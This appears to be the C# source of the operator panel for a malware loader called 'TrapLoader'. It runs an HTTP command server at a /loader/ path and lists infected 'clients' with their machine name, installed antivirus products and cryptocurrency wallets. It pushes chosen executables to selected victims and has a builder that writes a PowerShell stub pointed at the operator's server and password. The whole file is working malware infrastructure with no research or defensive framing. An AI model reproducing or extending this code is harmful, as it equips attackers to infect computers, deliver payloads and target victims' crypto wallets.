using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.IO;
using Microsoft.Win32;
using System.ComponentModel;
using System.Windows.Threading;
using System.Security.Cryptography.X509Certificates;
using System.Security.Authentication;
using System.Security.Cryptography;
using System.Diagnostics;
using System.Security.Principal;
using System.Text.RegularExpressions;

namespace WpfApp
{
    public partial class MainWindow : Window
    {
        private bool _isListening;
        private readonly Dictionary<string, string> _connectedClients = new Dictionary<string, string>();
        private ObservableCollection<ClientItem> _clientItems = new ObservableCollection<ClientItem>();
        public ObservableCollection<ClientItem> ClientItems => _clientItems;

        private string _selectedFilePath; // To store the selected executable file path

        // SSL support
        private X509Certificate2 _serverCertificate;
        private const string CertPath = "serverCert.pfx"; // ensure file exists next to exe
        private const string CertPassword = "pass"; // set to your pfx password

        private HttpServer _httpServer; // HTTPS listener helper
        private readonly Dictionary<string, DateTime> _clientLastSeen = new Dictionary<string, DateTime>();

        private string _serverPassword;
        private int _currentPort = -1;

        public MainWindow()
        {
            InitializeComponent();
            clientList.ItemsSource = ClientItems; // Bind the ListBox to the ObservableCollection

            // Initialize the client check timer
            _clientCheckTimer = new DispatcherTimer
            {
                Interval = TimeSpan.FromSeconds(5) // Check every 5 seconds
            };
            _clientCheckTimer.Tick += ClientCheckTimer_Tick;
            _clientCheckTimer.Start();
            
            // Set default values
            builderPortTextBox.Text = "333"; // Default port
        }
        
        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            // Set initial visibility based on the selected tab
            UpdateControlPanelVisibility();
            
            // Force selection to Clients tab on startup
            tabControl.SelectedItem = clientsTab;
            
            // Sync values between panels
            SyncPanelValues();
        }

        // Handle tab selection changes to show/hide the control panel
        private void TabControl_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            UpdateControlPanelVisibility();
        }
        
        // Helper method to update control panel visibility
        private void UpdateControlPanelVisibility()
        {
            // The control panel is now embedded within the Clients tab
            // and will automatically be shown/hidden with the tab
        }

        private DispatcherTimer _clientCheckTimer;

        private void ClientCheckTimer_Tick(object sender, EventArgs e)
        {
            // Remove clients not seen within the last 15 seconds
            var threshold = TimeSpan.FromSeconds(15);
            var now = DateTime.UtcNow;

            var toRemove = _clientLastSeen.Where(kvp => now - kvp.Value > threshold)
                                          .Select(kvp => kvp.Key)
                                          .ToList();

            foreach (var name in toRemove)
            {
                _clientLastSeen.Remove(name);
                RemoveClientUI(name);
                AppendLog($"Client {name} timed-out and was removed after {threshold.TotalSeconds} seconds of inactivity.");
            }
        }

        private void RemoveClientUI(string clientName)
        {
            Application.Current.Dispatcher.Invoke(() =>
            {
                var item = ClientItems.FirstOrDefault(c => c.Name == clientName);
                if (item != null)
                {
                    ClientItems.Remove(item);
                    UpdateClientCount();
                }
            });
        }

        private void SetPasswordButton_Click(object sender, RoutedEventArgs e)
        {
            // Get password from client panel
            string password = HttpPasswordTextBox.Text.Trim();
            
            if (string.IsNullOrWhiteSpace(password))
            {
                AppendLog("Please enter a password in the client panel.");
                return;
            }
            
            _serverPassword = password;
            AppendLog("Server password set.");
            UpdateStatus("Password set.");
        }

        private void SelectFileButton_Click(object sender, RoutedEventArgs e)
        {
            _selectedFilePath = FileSelector.SelectFile(logTextBox);
        }

        public void RemoveClient(string clientName)
        {
            Application.Current.Dispatcher.Invoke(() =>
            {
                if (_connectedClients.ContainsKey(clientName))
                {
                    _connectedClients.Remove(clientName);
                    var clientItem = ClientItems.FirstOrDefault(c => c.Name == clientName);
                    if (clientItem != null)
                    {
                        ClientItems.Remove(clientItem);
                        AppendLog($"Removed client from UI: {clientItem.Name}");
                        UpdateClientCount();
                    }
                    AppendLog($"Client disconnected: {clientName}");
                }
            });
        }

        public void AddClient(string name, ClientInfo clientInfo, bool isSelected)
        {
            Application.Current.Dispatcher.Invoke(() =>
            {
                ClientItems.Add(new ClientItem(name, clientInfo.OSVersion, clientInfo.MachineName, clientInfo.AntivirusProducts, clientInfo.CryptoWallet, isSelected));
                UpdateClientCount();
            });
        }

        private void RefreshButton_Click(object sender, RoutedEventArgs e)
        {
            // Refresh client list (no-op for HTTP clients as they're stateless)
            statusTextBox.Text = "HTTP clients refresh automatically with each request.";
        }

        private void LogMessage(string message)
        {
            if (logTextBox != null)
            {
                Application.Current.Dispatcher.Invoke(() =>
                {
                    logTextBox.Text += $"{message}\n"; // Append the message to the log
                });
            }
        }

        private async void SendFileButton_Click(object sender, RoutedEventArgs e)
        {
            var selectedClients = ClientItems.Where(c => c.IsSelected).ToList();

            if (string.IsNullOrEmpty(_selectedFilePath))
            {
                AppendLog("Please select a file first.");
                return;
            }

            if (selectedClients.Count == 0)
            {
                AppendLog("No clients selected.");
                return;
            }

            foreach (var client in selectedClients)
            {
                // Queue the file for sending when client next connects
                _httpServer?.EnqueueFileForClient(client.Name, _selectedFilePath);
                AppendLog($"File queued for {client.Name}: {Path.GetFileName(_selectedFilePath)}");
            }

            UpdateLastFileLabel();
        }

        public void AppendLog(string message)
        {
            if (logTextBox == null) return;
            Application.Current.Dispatcher.Invoke(() =>
            {
                logTextBox.Text += message + "\n";
            });
        }

        public void OnHttpClientInfo(string clientId, string systemInfo)
        {
            _clientLastSeen[clientId] = DateTime.UtcNow;
            var parts = systemInfo.Split(';');
            var clientInfo = new ClientInfo
            {
                OSVersion = parts.Length > 0 ? parts[0] : "Unknown",
                MachineName = parts.Length > 1 ? parts[1] : "Unknown",
                AntivirusProducts = parts.Length > 2 ? parts[2] : "",
                CryptoWallet = parts.Length > 3 ? parts[3] : ""
            };

            Application.Current.Dispatcher.Invoke(() =>
            {
                var existing = ClientItems.FirstOrDefault(c => c.Name == clientId);
                if (existing == null)
                {
                    AddClient(clientId, clientInfo, false);
                    AppendLog($"HTTP client connected: {clientId} ({clientInfo.MachineName})");
                }
                else
                {
                    existing.OSVersion = clientInfo.OSVersion;
                    existing.MachineName = clientInfo.MachineName;
                    existing.AntivirusProducts = clientInfo.AntivirusProducts;
                    existing.CryptoWallet = clientInfo.CryptoWallet;
                    AppendLog($"HTTP client updated: {clientId} ({clientInfo.MachineName})");
                }
            });
        }

        private void SearchButton_Click(object sender, RoutedEventArgs e)
        {
            string searchTerm = searchTextBox.Text;
            if (string.IsNullOrWhiteSpace(searchTerm))
            {
                clientList.ItemsSource = ClientItems; // Reset filter
                AppendLog("Search cleared.");
            }
            else
            {
                var filteredList = ClientItems.Where(c =>
                    c.Name.IndexOf(searchTerm, StringComparison.OrdinalIgnoreCase) >= 0 ||
                    c.OSVersion.IndexOf(searchTerm, StringComparison.OrdinalIgnoreCase) >= 0 ||
                    c.MachineName.IndexOf(searchTerm, StringComparison.OrdinalIgnoreCase) >= 0 ||
                    c.AntivirusProducts.IndexOf(searchTerm, StringComparison.OrdinalIgnoreCase) >= 0 ||
                    c.CryptoWallet.IndexOf(searchTerm, StringComparison.OrdinalIgnoreCase) >= 0
                ).ToList();
                clientList.ItemsSource = filteredList;
                AppendLog($"Filtered clients by: '{searchTerm}'. Found {filteredList.Count} matches.");
            }
        }

        private void StartListeningButton_Click(object sender, RoutedEventArgs e)
        {
            // Use the port from the builder's port textbox now
            if (!int.TryParse(listenportTextBox.Text, out int port) || port <= 0 || port > 65535)
            {
                AppendLog("Please enter a valid port number (1-65535).");
                return;
            }

            // Get password from client panel
            string password = HttpPasswordTextBox.Text;

            if (string.IsNullOrWhiteSpace(password))
            {
                AppendLog("Password is not set. Please set a password before starting the server.");
                return;
            }

            _serverPassword = password;
            _currentPort = port;

            try
            {
                // No certificate needed for pure HTTP
                string prefix = $"http://+:{port}/loader/";
                
                // Forcing HTTP now, so no certificate needed
                _httpServer = new HttpServer(this, prefix, _serverPassword, null);
                _httpServer.Start();

                startListeningButton.IsEnabled = false;
                stopListeningButton.IsEnabled = true;
                listenportTextBox.IsReadOnly = true;
                HttpPasswordTextBox.IsReadOnly = true;

                AppendLog($"HTTP server started on port {port}.");
                UpdateStatus($"Listening on port {port}.");
            }
            catch (HttpListenerException ex)
            {
                AppendLog($"Error starting server: {ex.Message}. Try running as Administrator.");
            }
            catch (Exception ex)
            {
                AppendLog($"An unexpected error occurred: {ex.Message}");
            }
        }
        
        /// <summary>
        /// Ensures netsh http add urlacl is run for the specified port.
        /// This is required for HttpListener to run without administrator privileges.
        /// </summary>
        private void EnsureHttpsCertificateBinding(int port, X509Certificate2 certificate)
        {
            // Not needed for HTTP
        }
        
        private static bool IsAdministrator()
        {
            using (var identity = WindowsIdentity.GetCurrent())
            {
                var principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }
        
        /// <summary>
        /// Helper to run netsh commands.
        /// </summary>
        private void RunNetsh(string arguments)
        {
            try
            {
                var processStartInfo = new ProcessStartInfo("netsh", arguments)
                {
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    Verb = "runas"
                };

                using (var process = Process.Start(processStartInfo))
                {
                    process?.WaitForExit();
                }
            }
            catch (Exception ex)
            {
                LogError($"Failed to run netsh command '{arguments}': {ex.Message}");
            }
        }

        private void StopListeningButton_Click(object sender, RoutedEventArgs e)
        {
            _httpServer?.Stop();
            startListeningButton.IsEnabled = true;
            stopListeningButton.IsEnabled = false;
            listenportTextBox.IsReadOnly = false;
            HttpPasswordTextBox.IsReadOnly = false;
            AppendLog("Server stopped.");
            UpdateStatus("Stopped listening.");
        }

        private void LogError(string message)
        {
            AppendLog($"ERROR: {message}");
        }

        private ClientInfo GetClientInfo(string clientId)
        {
            // This method would fetch client details, but with stateless HTTP clients,
            // the info is pushed from the client with each request.
            return null; // Placeholder
        }

        public class ClientItem : INotifyPropertyChanged
        {
            private string _osVersion;
            private string _machineName;
            private string _antivirusProducts; // Changed from Architecture to Antivirus
            private string _cryptoWallet;
            private bool _isSelected;

            public string Name { get; set; }

            public string OSVersion
            {
                get => _osVersion;
                set { _osVersion = value; OnPropertyChanged(nameof(OSVersion)); }
            }

            public string MachineName
            {
                get => _machineName;
                set { _machineName = value; OnPropertyChanged(nameof(MachineName)); }
            }

            public string AntivirusProducts
            {
                get => _antivirusProducts;
                set { _antivirusProducts = value; OnPropertyChanged(nameof(AntivirusProducts)); }
            }
            
            public string CryptoWallet
            {
                get => _cryptoWallet;
                set { _cryptoWallet = value; OnPropertyChanged(nameof(CryptoWallet)); }
            }

            public bool IsSelected
            {
                get => _isSelected;
                set
                {
                    if (_isSelected != value)
                    {
                        _isSelected = value;
                        OnPropertyChanged(nameof(IsSelected));
                    }
                }
            }

            public ClientItem(string name, string osVersion, string machineName, string antivirusProducts, string walletNames, bool isSelected)
            {
                Name = name;
                OSVersion = osVersion;
                MachineName = machineName;
                AntivirusProducts = antivirusProducts;
                CryptoWallet = walletNames; // Initialize CryptoWallet
                IsSelected = isSelected;
            }

            public event PropertyChangedEventHandler PropertyChanged;
            protected void OnPropertyChanged(string propertyName)
            {
                PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));
            }
        }

        public class ClientInfo
        {
            public string OSVersion { get; set; }
            public string MachineName { get; set; }
            public string AntivirusProducts { get; set; } // Keep as string if displaying directly
            public string CryptoWallet { get; set; }
        }

        public void UpdateClientCount(int explicitCount = -1)
        {
            Application.Current.Dispatcher.Invoke(() =>
            {
                int countToShow = explicitCount >= 0 ? explicitCount : ClientItems.Count;
                clientCountLbl.Content = countToShow.ToString();
            });
        }

        private void UpdateLastFileLabel()
        {
            if (!string.IsNullOrEmpty(_selectedFilePath))
            {
                Application.Current.Dispatcher.Invoke(() =>
                {
                    lastFileLbl.Content = $"Selected: {Path.GetFileName(_selectedFilePath)}";
                });
            }
        }

        private void GenerateSelfSignedCertificate()
        {
            try
            {
                AppendLog("Generating self-signed certificate...");
                
                // Create a self-signed certificate using the built-in method
                var distinguishedName = new X500DistinguishedName("CN=TrapLoader");
                using (var rsa = System.Security.Cryptography.RSA.Create(2048))
                {
                    var request = new CertificateRequest(distinguishedName, rsa, 
                        System.Security.Cryptography.HashAlgorithmName.SHA256, 
                        System.Security.Cryptography.RSASignaturePadding.Pkcs1);
                    
                    // Add enhanced key usage extension
                    request.CertificateExtensions.Add(
                        new X509EnhancedKeyUsageExtension(
                            new System.Security.Cryptography.OidCollection { new System.Security.Cryptography.Oid("1.3.6.1.5.5.7.3.1") }, false));
                    
                    // Add basic constraints extension
                    request.CertificateExtensions.Add(
                        new X509BasicConstraintsExtension(false, false, 0, true));
                    
                    // Create certificate that's valid for 1 year
                    var certificate = request.CreateSelfSigned(
                        DateTimeOffset.Now.AddDays(-1),
                        DateTimeOffset.Now.AddYears(1));
                    
                    // Export to PFX
                    File.WriteAllBytes(CertPath, certificate.Export(X509ContentType.Pfx, CertPassword));
                    
                    // Load with MachineKeySet so the private key is accessible for HTTP.SYS
                    _serverCertificate = new X509Certificate2(CertPath, CertPassword,
                        X509KeyStorageFlags.MachineKeySet | X509KeyStorageFlags.PersistKeySet);
                    AppendLog("Self-signed certificate generated successfully.");
                    AppendLog($"Certificate thumbprint: {_serverCertificate.Thumbprint}");
                }
            }
            catch (Exception ex)
            {
                AppendLog($"Failed to generate certificate: {ex.Message}");
            }
        }

        private void BuilderGenerateButton_Click(object sender, RoutedEventArgs e)
        {
            // No certificate required anymore
            statusTextBox.Text = "Generating stub...";
            
            // Get values directly from the builder panel
            string port = builderPortTextBox.Text.Trim();
            string password = builderPasswordBox.Password.Trim();
            string serverIp = builderIpTextBox.Text.Trim();
            
            if (string.IsNullOrWhiteSpace(port))
            {
                AppendLog("ERROR: Please enter a port number in the builder panel");
                return;
            }
            
            if (string.IsNullOrWhiteSpace(password))
            {
                AppendLog("ERROR: Please enter a password in the builder panel");
                return;
            }
            
            if (string.IsNullOrWhiteSpace(serverIp))
            {
                serverIp = "127.0.0.1"; // Default to localhost if not specified
                AppendLog($"No server IP specified, using default: {serverIp}");
            }
            
            // Ensure _serverPassword stays in sync for the running listener
            _serverPassword = password;
            
            // Generate stub code with values from the builder panel
            string stubCode = GenerateStubCode(port, password, serverIp);
            
            // Display output in the builder panel
            builderOutputTextBox.Text = $"Generated stub with:\nServer: {serverIp}:{port}\n\nSave the file to use it.";
            
            // Save to file
            SaveFileDialog saveFileDialog = new SaveFileDialog
            {
                Filter = "PowerShell script (*.ps1)|*.ps1",
                DefaultExt = ".ps1",
                FileName = "HttpStub.ps1"
            };
            
            if (saveFileDialog.ShowDialog() == true)
            {
                File.WriteAllText(saveFileDialog.FileName, stubCode);
                AppendLog($"Stub code saved to {saveFileDialog.FileName}");
                builderOutputTextBox.Text += $"\n\nSaved to: {saveFileDialog.FileName}";
            }
        }
        
        private string GenerateStubCode(string port, string password, string serverIp = "127.0.0.1")
        {
            string templatePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "PSStub_Direct.ps1");
            if (!File.Exists(templatePath))
            {
                AppendLog("Stub template not found: PSStub_Direct.ps1");
                return "# Template stub not found.";
            }

            string content = File.ReadAllText(templatePath);

            string serverUrl = $"http://{serverIp}:{port}/loader/";
            
            string encryptionKey = "TrapLoaderSecureKey123";

            // Simple replacement of default placeholders in PSStub_Direct.ps1
            content = content.Replace("http://127.0.0.1:333/loader/", serverUrl)
                             .Replace("password123", password)
                             .Replace("TrapLoaderSecureKey123", encryptionKey);

            return content;
        }

        // Method to synchronize values between panels
        private void SyncPanelValues()
        {
            // Copy builder port to client port for backward compatibility
            if (!string.IsNullOrWhiteSpace(builderPortTextBox.Text))
            {
                listenportTextBox.Text = builderPortTextBox.Text;
            }
            
            // Copy client port to builder port if builder port is empty
            if (string.IsNullOrWhiteSpace(builderPortTextBox.Text) && !string.IsNullOrWhiteSpace(listenportTextBox.Text))
            {
                builderPortTextBox.Text = listenportTextBox.Text;
            }
            
            // If we have a certificate, display its thumbprint
            if (_serverCertificate != null)
            {
                string thumbprint = _serverCertificate.Thumbprint;
                AppendLog($"Using certificate with thumbprint: {thumbprint}");
            }
        }

        private void UpdateStatus(string message)
        {
            if (statusTextBox == null) return;
            Application.Current.Dispatcher.Invoke(() =>
            {
                statusTextBox.Text = message;
            });
        }
    }
}
